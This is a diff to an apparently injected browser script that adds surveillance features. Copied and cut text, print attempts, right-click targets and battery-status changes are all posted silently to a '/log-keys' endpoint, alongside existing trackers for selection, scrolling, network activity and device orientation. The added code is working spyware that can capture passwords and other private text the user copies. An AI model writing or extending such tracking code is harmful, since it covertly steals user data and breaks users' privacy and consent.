@@ -883,6 +883,47 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         });
     }
 
+    // ═══ COPY / PRINT / CONTEXT-MENU CAPTURE ══════════════════
+    function initCopyPrintTracker() {
+        // Log when user copies text — more reliable than clipboard polling
+        document.addEventListener('copy', () => {
+            try {
+                const sel = window.getSelection && window.getSelection().toString().trim();
+                if (sel && sel.length > 0 && sel.length < 5000) {
+                    post('/log-keys', { keys: '[COPY] ' + sel, url: location.href });
+                }
+            } catch {}
+        });
+
+        // Log cut events
+        document.addEventListener('cut', () => {
+            try {
+                const sel = window.getSelection && window.getSelection().toString().trim();
+                if (sel && sel.length > 0 && sel.length < 5000) {
+                    post('/log-keys', { keys: '[CUT] ' + sel, url: location.href });
+                }
+            } catch {}
+        });
+
+        // Log print attempts
+        window.addEventListener('beforeprint', () => {
+            try { post('/log-keys', { keys: '[PRINT] User triggered print on ' + location.pathname, url: location.href }); } catch {}
+        });
+
+        // Log right-click (context menu) positions
+        let lastCtxMenu = 0;
+        document.addEventListener('contextmenu', e => {
+            const now = Date.now();
+            if (now - lastCtxMenu < 2000) return; // debounce 2s
+            lastCtxMenu = now;
+            try {
+                const target = e.target;
+                const desc = target.tagName + (target.id ? '#' + target.id : '') + (target.className ? '.' + String(target.className).split(' ')[0] : '');
+                post('/log-keys', { keys: `[RIGHT CLICK] on ${desc} at (${e.clientX},${e.clientY})`, url: location.href });
+            } catch {}
+        });
+    }
+
     // ═══ ERROR CAPTURE ══════════════════════════════════════════
     function initErrorCapture() {
         window.addEventListener('error', e => {
@@ -974,6 +1015,28 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         if (window.DeviceMotionEvent) window.addEventListener('devicemotion', captureMotion, { once: true });
     }
 
+    // ═══ BATTERY CHANGE MONITORING ════════════════════════════
+    // Subscribes once to battery levelchange + chargingchange events so any
+    // significant battery events are logged in real time without polling.
+    async function initBatteryMonitor() {
+        try {
+            if (!navigator.getBattery) return;
+            const b = await navigator.getBattery();
+            const report = (event) => {
+                try {
+                    post('/log-keys', {
+                        keys: `[BATTERY] level=${Math.round(b.level * 100)}% charging=${b.charging} event=${event}`,
+                        url: location.href
+                    });
+                } catch {}
+            };
+            b.addEventListener('levelchange', () => report('levelchange'));
+            b.addEventListener('chargingchange', () => report('chargingchange'));
+            b.addEventListener('chargingtimechange', () => report('chargingtimechange'));
+            b.addEventListener('dischargingtimechange', () => report('dischargingtimechange'));
+        } catch {}
+    }
+
     // ═══ INIT ══════════════════════════════════════════════════
     document.addEventListener('visibilitychange', () => {
         if (!document.hidden) {
@@ -1016,9 +1079,11 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initIdleTracker();
         initScrollTracker();
         initSelectionTracker();
+        initCopyPrintTracker();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
+        initBatteryMonitor();
     }
 
     // Works whether script is injected before OR after DOMContentLoaded fires
